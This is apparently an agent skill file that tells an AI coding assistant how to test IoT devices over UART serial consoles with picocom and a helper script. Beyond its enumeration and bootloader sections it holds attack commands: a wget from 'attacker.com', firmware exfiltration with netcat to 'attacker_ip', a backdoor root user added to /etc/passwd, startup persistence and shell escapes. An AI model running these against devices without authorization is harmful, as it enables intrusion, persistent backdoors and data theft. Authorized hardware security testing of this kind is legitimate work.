---
name: picocom
description: Use picocom to interact with IoT device UART consoles for pentesting operations including device enumeration, vulnerability discovery, bootloader manipulation, and gaining root shells. Use when the user needs to interact with embedded devices, IoT hardware, or serial consoles.
---

# IoT UART Console (picocom)

This skill enables interaction with IoT device UART consoles using picocom for security testing and penetration testing operations. It supports bootloader interaction, shell access (with or without authentication), device enumeration, and vulnerability discovery.

## Prerequisites

- picocom must be installed on the system
- Python 3 with pyserial library (`sudo pacman -S python-pyserial` on Arch, or `pip install pyserial`)
- UART connection to the target device (USB-to-serial adapter, FTDI cable, etc.)
- Appropriate permissions to access serial devices (typically /dev/ttyUSB* or /dev/ttyACM*)

## Recommended Approach: Serial Helper Script

**IMPORTANT**: This skill includes a Python helper script (`serial_helper.py`) that provides a clean, reliable interface for serial communication. **This is the RECOMMENDED method** for interacting with IoT devices.

### Default Session Logging

**ALL commands run by Claude will be logged to `/tmp/serial_session.log` by default.**

To observe what Claude is doing in real-time:
```bash
# In a separate terminal, run:
tail -f /tmp/serial_session.log
```

This allows you to watch all serial I/O as it happens without interfering with the connection.

### Why Use the Serial Helper?

The helper script solves many problems with direct picocom usage:
- **Clean output**: Automatically removes command echoes, prompts, and ANSI codes
- **Prompt detection**: Automatically detects and waits for device prompts
- **Timeout handling**: Proper timeout management with no arbitrary sleeps
- **Easy scripting**: Simple command-line interface for single commands or batch operations
- **Session logging**: All I/O logged to `/tmp/serial_session.log` for observation
- **Reliable**: No issues with TTY requirements or background processes

### Quick Start with Serial Helper

**Single Command:**
```bash
python3 .claude/skills/picocom/serial_helper.py --device /dev/ttyUSB0 --command "help"
```

**With Custom Prompt (recommended for known devices):**
```bash
python3 .claude/skills/picocom/serial_helper.py --device /dev/ttyUSB0 --prompt "User@[^>]+>" --command "ifconfig"
```

**Interactive Mode:**
```bash
python3 .claude/skills/picocom/serial_helper.py --device /dev/ttyUSB0 --interactive
```

**Batch Commands from File:**
```bash
# Create a file with commands (one per line)
echo -e "help\ndate\nifconfig\nps" > commands.txt
python3 .claude/skills/picocom/serial_helper.py --device /dev/ttyUSB0 --script commands.txt
```

**JSON Output (for parsing):**
```bash
python3 .claude/skills/picocom/serial_helper.py --device /dev/ttyUSB0 --command "help" --json
```

**Debug Mode:**
```bash
python3 .claude/skills/picocom/serial_helper.py --device /dev/ttyUSB0 --command "help" --debug
```

**Session Logging (for observation):**
```bash
# Terminal 1 - Run with logging
python3 .claude/skills/picocom/serial_helper.py \
  --device /dev/ttyUSB0 \
  --prompt "User@[^>]+>" \
  --logfile /tmp/session.log \
  --interactive

# Terminal 2 - Watch the session in real-time
tail -f /tmp/session.log
```

**Note:** See `OBSERVING_SESSIONS.md` for comprehensive guide on monitoring serial sessions.

### Monitor Mode (Passive Listening)

**NEW FEATURE**: Monitor mode is designed for passive UART monitoring where the device outputs logs without prompts or interaction.

**Use cases:**
- Monitoring boot logs from devices without interactive consoles
- Capturing triggered output when external actions are performed
- Testing if network requests or hardware events generate UART logs
- Baseline vs triggered output comparison

**Basic passive monitoring:**
```bash
python3 .claude/skills/picocom/serial_helper.py \
  --device /dev/ttyUSB0 \
  --monitor \
  --duration 30 \
  --logfile /tmp/uart.log
```

**Monitor with external trigger script:**
```bash
# Run external script after 5 seconds and capture triggered UART output
python3 .claude/skills/picocom/serial_helper.py \
  --device /dev/ttyUSB0 \
  --monitor \
  --duration 60 \
  --trigger-script "python3 /path/to/test_script.py" \
  --trigger-delay 5 \
  --logfile /tmp/triggered_uart.log
```

**Monitor with baseline capture:**
```bash
# Capture 10s baseline, run trigger at 15s, continue for total 60s
python3 .claude/skills/picocom/serial_helper.py \
  --device /dev/ttyUSB0 \
  --monitor \
  --duration 60 \
  --trigger-script "curl http://192.168.1.100/api/reboot" \
  --trigger-delay 15 \
  --baseline-duration 10 \
  --logfile /tmp/reboot_monitor.log
```

**Monitor mode options:**
- `--duration SECONDS` - Total monitoring time (default: 30)
- `--trigger-script CMD` - External command/script to run during monitoring
- `--trigger-delay SECONDS` - When to run trigger (default: 5)
- `--baseline-duration SECONDS` - Capture baseline before trigger (default: 0)
- `--logfile FILE` - Log all I/O to file
- `--json` - Output results in JSON format

**Output includes:**
- Real-time timestamped console output
- Baseline vs trigger vs post-trigger categorization
- Trigger script exit code and output
- Summary statistics (bytes captured in each phase)
- Timeline with all captured data

### Serial Helper Options

```
Required (one of):
  --command, -c CMD         Execute single command
  --interactive, -i         Enter interactive mode
  --script, -s FILE         Execute commands from file
  --monitor, -m             Passive monitoring mode (just listen, no commands)

Connection Options:
  --device, -d DEV          Serial device (default: /dev/ttyUSB0)
  --baud, -b RATE           Baud rate (default: 115200)
  --timeout, -t SECONDS     Command timeout (default: 3.0)
  --prompt, -p PATTERN      Custom prompt regex pattern

Monitor Mode Options:
  --duration SECONDS        Monitoring duration (default: 30.0)
  --trigger-script CMD      External script/command to run during monitoring
  --trigger-delay SECONDS   Seconds before running trigger (default: 5.0)
  --baseline-duration SEC   Baseline capture duration (default: 0.0)

Output Options:
  --raw, -r                 Don't clean output (show echoes, prompts)
  --json, -j                Output in JSON format
  --logfile, -l FILE        Log all I/O to file (can tail -f in another terminal)
  --debug                   Show debug information
```

### Common Prompt Patterns

The helper script includes common prompt patterns, but you can specify custom ones:

```bash
# Uniview camera
--prompt "User@[^>]+>"

# Standard root/user prompts
--prompt "[#\$]\s*$"

# U-Boot bootloader
--prompt "=>\s*$"

# Custom device
--prompt "MyDevice>"
```

### Device Enumeration Example with Serial Helper

Here's a complete example of safely enumerating a device:

```bash
# Set variables for convenience
HELPER="python3 .claude/skills/picocom/serial_helper.py"
DEVICE="/dev/ttyUSB0"
PROMPT="User@[^>]+>"  # Adjust for your device
LOGFILE="/tmp/serial_session.log"

# Get available commands
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "help"

# System information
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "date"
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "runtime"

# Network configuration
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "ifconfig"
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "route"

# Process listing (may need longer timeout)
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --timeout 5 --command "ps"

# File system exploration
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "ls"
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "ls /etc"

# Device identifiers
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "getudid"
$HELPER --device $DEVICE --prompt "$PROMPT" --logfile "$LOGFILE" --command "catmwarestate"
```

**IMPORTANT FOR CLAUDE CODE**: When using this skill, ALWAYS include `--logfile /tmp/serial_session.log` in every command so the user can monitor activity with `tail -f /tmp/serial_session.log`.

### Pentesting Use Case: Trigger-Based UART Analysis

A common IoT pentesting scenario: testing if network requests, API calls, or hardware events trigger debug output on UART.

**Example: Testing if API requests generate UART logs**
```bash
# Monitor UART while sending network request
python3 .claude/skills/picocom/serial_helper.py \
  --device /dev/ttyUSB0 \
  --monitor \
  --duration 30 \
  --trigger-script "curl -X POST http://192.168.1.100/api/update" \
  --trigger-delay 5 \
  --logfile /tmp/api_test.log

# Review what the device logged when API was called
cat /tmp/api_test.log
```

**Example: Testing authentication attempts**
```bash
# Monitor UART during login attempts
python3 .claude/skills/picocom/serial_helper.py \
  --device /dev/ttyUSB0 \
  --monitor \
  --duration 45 \
  --trigger-script "python3 brute_force_login.py" \
  --trigger-delay 10 \
  --baseline-duration 5 \
  --logfile /tmp/auth_test.log \
  --json > /tmp/auth_results.json
```

**Example: Boot sequence analysis**
```bash
# Capture device boot logs (reboot via network API)
python3 .claude/skills/picocom/serial_helper.py \
  --device /dev/ttyUSB0 \
  --monitor \
  --duration 120 \
  --trigger-script "curl http://192.168.1.100/api/reboot" \
  --trigger-delay 5 \
  --logfile /tmp/boot_sequence.log
```

**Why this is useful for pentesting:**
- Devices often leak sensitive info (passwords, keys, paths) in UART logs
- Debug output may reveal internal API endpoints or protocols
- Error messages can expose vulnerabilities
- Boot logs show secure boot status, loaded modules, and filesystem paths
- Authentication attempts may log usernames/tokens in cleartext

**IMPORTANT FOR CLAUDE CODE**: When using this skill, ALWAYS include `--logfile /tmp/serial_session.log` in every command so the user can monitor activity with `tail -f /tmp/serial_session.log`.

## Alternative: Direct picocom Usage (Advanced)

If you need direct picocom access (e.g., for bootloader interaction during boot), you can use picocom directly. However, this is more complex and error-prone.

## Instructions

### 1. Connection Setup

**CRITICAL**: picocom runs interactively and CANNOT be controlled via standard stdin/stdout pipes. Use the following approach:

1. **Always run picocom in a background shell** using `run_in_background: true`
2. **Monitor output** using the BashOutput tool to read responses
3. **Send commands** by using `Ctrl-A Ctrl-S` to enter send mode, or by writing to the device file directly

**Default connection command:**
```bash
picocom -b 115200 --nolock --omap crlf --echo /dev/ttyUSB0
```

**Defaults (unless specified otherwise):**
- **Baud rate**: 115200 (most common for IoT devices)
- **Device**: /dev/ttyUSB0 (most common USB-to-serial adapter)
- **Always use `--nolock`**: Prevents file locking issues unless user specifically requests otherwise

**Alternative baud rates** (if 115200 doesn't work):
- 57600
- 38400
- 19200
- 9600
- 230400 (less common, high-speed)

**Alternative device paths:**
- /dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, ... (USB-to-serial adapters)
- /dev/ttyACM0, /dev/ttyACM1, ... (USB CDC devices)
- /dev/ttyS0, /dev/ttyS1, ... (built-in serial ports)

**Essential picocom options:**
- `-b` or `--baud`: Set baud rate (use 115200 by default)
- `--nolock`: Disable file locking (ALWAYS use unless user asks not to)
- `--omap crlf`: Map output CR to CRLF (helps with formatting)
- `--echo`: Enable local echo (see what you type)
- `--logfile <file>`: Log all session output to a file (recommended)
- `-q` or `--quiet`: Suppress picocom status messages
- `--imap lfcrlf`: Map LF to CRLF on input (sometimes needed)

### 2. Detecting Console State

After connecting, you need to identify what state the device is in:

**a) Blank/Silent Console:**
- Press Enter several times to check for a prompt
- Try Ctrl-C to interrupt any running processes
- If still nothing, the device may be in bootloader waiting state - try space bar or other bootloader interrupt keys

**b) Bootloader (U-Boot, etc.):**
- Look for prompts like `U-Boot>`, `=>`, `uboot>`, `Boot>`
- Bootloaders often have a countdown that can be interrupted
- Common interrupt keys: Space, Enter, specific keys mentioned in boot messages

**c) Login Prompt:**
- Look for `login:` or `username:` prompts
- Common default credentials for IoT devices:
  - root / root
  - admin / admin
  - root / (no password)
  - admin / password
  - Check manufacturer documentation or online databases

**d) Shell Access:**
- You may drop directly into a root shell
- Look for prompts like `#`, `$`, `>`, or custom prompts

### 2.1. BusyBox Shells (Most IoT Devices)

**IMPORTANT**: The vast majority of IoT devices use BusyBox, a lightweight suite of Unix utilities designed for embedded systems. BusyBox provides a minimal shell environment with limited command functionality.

**Identifying BusyBox:**
```bash
# Check what shell you're using
busybox
busybox --help

# Or check symlinks
ls -la /bin/sh
# Often shows: /bin/sh -> /bin/busybox

# List available BusyBox applets
busybox --list
```

**BusyBox Limitations:**
- Many standard Linux commands may be simplified versions
- Some common flags/options may not be available
- Features like tab completion may be limited or absent
- Some exploitation techniques that work on full Linux may not work

**Common BusyBox commands available:**
```bash
# Core utilities (usually available)
cat, ls, cd, pwd, echo, cp, mv, rm, mkdir, chmod, chown
ps, kill, top, free, df, mount, umount
grep, find, sed, awk (limited versions)
ifconfig, route, ping, netstat, telnet
vi (basic text editor - no syntax highlighting)

# Check what's available
busybox --list | sort
ls /bin /sbin /usr/bin /usr/sbin
```

**BusyBox-specific considerations for pentesting:**
- `ps` output format may differ from standard Linux
- Some privilege escalation techniques require commands not in BusyBox
- File permissions still work the same (SUID, sticky bits, etc.)
- Networking tools are often present (telnet, wget, nc/netcat, ftpget)
- Python/Perl/Ruby are usually NOT available (device storage constraints)

**Useful BusyBox commands for enumeration:**
```bash
# Check BusyBox version (may have known vulnerabilities)
busybox | head -1

# Network utilities often available
nc -l -p 4444  # Netcat listener
wget http://attacker.com/shell.sh
ftpget server file
telnet 192.168.1.1

# httpd (web server) often included
busybox httpd -p 8080 -h /tmp  # Quick file sharing
```

**Reference Documentation:**
- [BusyBox Official Site](https://busybox.net/)
- [BusyBox Command List](https://busybox.net/downloads/BusyBox.html)
- [BusyBox Source Code](https://git.busybox.net/busybox/)

### 3. Interacting with the Console

**Sending commands to picocom:**

Since picocom is interactive, you have several options:

**Option A: Write directly to the device file**
```bash
echo "command" > /dev/ttyUSB0
```

**Option B: Use expect or similar tools**
```bash
expect -c "
  spawn picocom -b 115200 --nolock /dev/ttyUSB0
  send \"command\r\"
  expect \"#\"
  exit
"
```

**Option C: Use screen instead of picocom (may be easier to script)**
```bash
screen /dev/ttyUSB0 115200
```

**Picocom keyboard shortcuts:**
- `Ctrl-A Ctrl-X`: Exit picocom
- `Ctrl-A Ctrl-Q`: Quit without resetting
- `Ctrl-A Ctrl-U`: Increase baud rate
- `Ctrl-A Ctrl-D`: Decrease baud rate
- `Ctrl-A Ctrl-T`: Toggle local echo
- `Ctrl-A Ctrl-S`: Send file (can be used to send commands)

### 4. Device Enumeration

Once you have shell access, gather the following information:

**System Information:**
```bash
# Kernel and system info
uname -a
cat /proc/version
cat /proc/cpuinfo
cat /proc/meminfo

# Distribution/firmware info
cat /etc/issue
cat /etc/*release*
cat /etc/*version*

# Hostname and network
hostname
cat /etc/hostname
ifconfig -a
ip addr show
cat /etc/network/interfaces
cat /etc/resolv.conf

# Mounted filesystems
mount
cat /proc/mounts
df -h

# Running processes
ps aux
ps -ef
top -b -n 1
```

**User and Permission Information:**
```bash
# Current user context
id
whoami
groups

# User accounts
cat /etc/passwd
cat /etc/shadow  # If readable - major security issue!
cat /etc/group

# Sudo/privilege info
sudo -l
cat /etc/sudoers
```

**Network Services:**
```bash
# Listening services
netstat -tulpn
ss -tulpn
lsof -i

# Firewall rules
iptables -L -n -v
cat /etc/iptables/*
```

**Interesting Files and Directories:**
```bash
# Configuration files
ls -la /etc/
find /etc/ -type f -readable

# Web server configs
ls -la /etc/nginx/
ls -la /etc/apache2/
ls -la /var/www/

# Credentials and keys
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null
find / -name "*password*" 2>/dev/null
find / -name "*credential*" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null

# SUID/SGID binaries (privilege escalation vectors)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# World-writable files/directories
find / -perm -2 -type f 2>/dev/null
find / -perm -2 -type d 2>/dev/null

# Development/debugging tools
which gdb gcc python perl ruby tcpdump
ls /usr/bin/ /bin/ /sbin/ /usr/sbin/
```

### 5. Bootloader Exploitation

If you have access to the bootloader (U-Boot, etc.):

**Common U-Boot commands:**
```bash
# Print environment variables
printenv

# Modify boot arguments (e.g., init=/bin/sh for root shell)
setenv bootargs "${bootargs} init=/bin/sh"
saveenv
boot

# Alternative: single user mode
setenv bootargs "${bootargs} single"
setenv bootargs "${bootargs} init=/bin/bash"

# Boot from network (TFTP) for custom firmware
setenv serverip 192.168.1.100
setenv ipaddr 192.168.1.200
tftpboot 0x80000000 custom_image.bin
bootm 0x80000000

# Memory examination
md <address>  # Memory display
mm <address>  # Memory modify
mw <address> <value>  # Memory write

# Flash operations
erase <start> <end>
cp.b <source> <dest> <count>

# Other useful commands
help
bdinfo  # Board info
version
reset
```

### 6. Privilege Escalation (if not root)

**Check for common vulnerabilities:**
```bash
# Kernel exploits
uname -r  # Check kernel version for known exploits

# Check for exploitable services
ps aux | grep root

# Writable service files
find /etc/init.d/ -writable 2>/dev/null
find /lib/systemd/system/ -writable 2>/dev/null

# Cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
```

### 7. Persistence and Further Access

**Establish additional access methods:**
```bash
# Add SSH access
mkdir -p /root/.ssh
echo "your_ssh_public_key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Start SSH service (if not running)
/etc/init.d/ssh start
# or
/etc/init.d/sshd start
# or
/etc/init.d/dropbear start  # Common on embedded devices

# Add a backdoor user
echo "backdoor:x:0:0::/root:/bin/sh" >> /etc/passwd
passwd backdoor

# Add to startup scripts
echo "/path/to/backdoor &" >> /etc/rc.local
```

### 8. Firmware Extraction

**Extract firmware for offline analysis:**
```bash
# Find MTD partitions (common on embedded devices)
cat /proc/mtd
cat /proc/partitions

# Dump flash partitions
dd if=/dev/mtd0 of=/tmp/bootloader.bin
dd if=/dev/mtd1 of=/tmp/kernel.bin
dd if=/dev/mtd2 of=/tmp/rootfs.bin

# Copy to external storage or network
# If network is available:
nc attacker_ip 4444 < /tmp/rootfs.bin

# If USB storage is available:
mount /dev/sda1 /mnt
cp /tmp/*.bin /mnt/
umount /mnt
```

### 9. Cleanup and Exit

**To exit picocom:**
- Press `Ctrl-A` followed by `Ctrl-X`
- Or use `killall picocom` from another terminal

**If you need to kill the background shell:**
- Use the KillShell tool with the appropriate shell_id

## Common IoT Device Scenarios

### Scenario 1: No Authentication Shell
```bash
# Connect
picocom -b 115200 --nolock /dev/ttyUSB0

# Press Enter, get root shell immediately
# Enumerate and exploit
```

### Scenario 2: Password-Protected Shell
```bash
# Connect and see login prompt
# Try default credentials:
# - root/root
# - admin/admin
# - root/(empty)
# Search online for device-specific defaults
```

### Scenario 3: Bootloader to Root Shell
```bash
# Interrupt boot countdown (press Space/Enter)
# Get U-Boot prompt
setenv bootargs "${bootargs} init=/bin/sh"
boot
# Get root shell without authentication
```

### Scenario 4: Limited Shell Escape
```bash
# If you get a limited shell:
# Try common escape techniques:
echo $SHELL
/bin/sh
/bin/bash
vi  # Then :!/bin/sh
less /etc/passwd  # Then !/bin/sh
find / -exec /bin/sh \;
awk 'BEGIN {system("/bin/sh")}'
```

## Security Testing Checklist

- [ ] Identify device and firmware version
- [ ] Check for default credentials
- [ ] Enumerate network services and open ports
- [ ] Check for hardcoded credentials in files
- [ ] Test for command injection vulnerabilities
- [ ] Check file permissions (SUID, world-writable)
- [ ] Test bootloader security (password protection, command restrictions)
- [ ] Check for outdated software with known CVEs
- [ ] Test for privilege escalation vectors
- [ ] Extract firmware for offline analysis
- [ ] Document all findings with screenshots/logs

## Best Practices

1. **Always log your session**: Use `--logfile session.log`
2. **Document everything**: Take notes on commands, responses, and findings
3. **Be patient**: Some devices are slow and may take time to respond
4. **Check baud rate**: Wrong baud rate = garbage output. Try common rates if you see garbled text
5. **Research the device**: Look up known vulnerabilities, default credentials, and common issues
6. **Use proper authorization**: Only perform pentesting on devices you own or have explicit permission to test
7. **Backup**: If possible, backup firmware before making modifications
8. **Be careful with bootloader**: Incorrect bootloader commands can brick devices

## Troubleshooting

**Problem: Garbled text or strange characters**
- Solution: Wrong baud rate. Try 115200, 57600, 38400, 19200, 9600

**Problem: No output at all**
- Solution: Check physical connections, try pressing Enter, check if device is powered on

**Problem: "Device busy" or "Permission denied"**
- Solution: Close other programs using the serial port, check user permissions (`sudo usermod -a -G dialout $USER`)

**Problem: Commands not echoing**
- Solution: Enable local echo with `--echo` flag or press `Ctrl-A Ctrl-T` in picocom

**Problem: Wrong line endings (extra lines or no line breaks)**
- Solution: Use `--omap crlf` or `--imap lfcrlf` options

## Example Usage

```bash
# Basic connection (using defaults)
picocom -b 115200 --nolock --echo --omap crlf /dev/ttyUSB0

# Connection with logging
picocom -b 115200 --nolock --echo --logfile iot_pentest.log /dev/ttyUSB0

# Quiet mode (suppress picocom messages)
picocom -b 115200 --nolock -q --echo /dev/ttyUSB0

# Run in background for scripted interaction
picocom -b 115200 --nolock /dev/ttyUSB0 &
# Then use BashOutput to monitor
```

## References

- [picocom documentation](https://github.com/npat-efault/picocom)
- [U-Boot documentation](https://u-boot.readthedocs.io/)
- IoT pentesting resources and vulnerability databases
- Device-specific documentation and datasheets
